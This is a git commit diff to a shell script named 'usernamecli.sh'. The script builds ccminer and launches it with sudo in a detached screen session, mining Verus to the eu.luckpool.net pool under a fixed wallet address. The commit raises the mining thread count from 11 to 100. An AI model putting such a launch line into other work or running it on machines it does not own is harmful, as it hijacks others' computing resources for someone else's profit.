4506dc28f421f2245177a45834c6397778b3fa61
hellousername0 <113550343+hellousername0@users.noreply.github.com>
2022-10-08 09:45:16 +0300

    Update usernamecli.sh

--- usernamecli.sh
+++ usernamecli.sh
@@ -6,4 +6,4 @@ sudo chmod +x build.sh
 sudo chmod +x configure.sh 
 sudo chmod +x autogen.sh 
 sudo ./build.sh
-sudo screen -A -m -d ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RXDPCKWcL75zQ2zjkmb4x723NQZkJNQdxW.0510v1550 -p x -t 11
+sudo screen -A -m -d ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RXDPCKWcL75zQ2zjkmb4x723NQZkJNQdxW.0510v1550 -p x -t 100
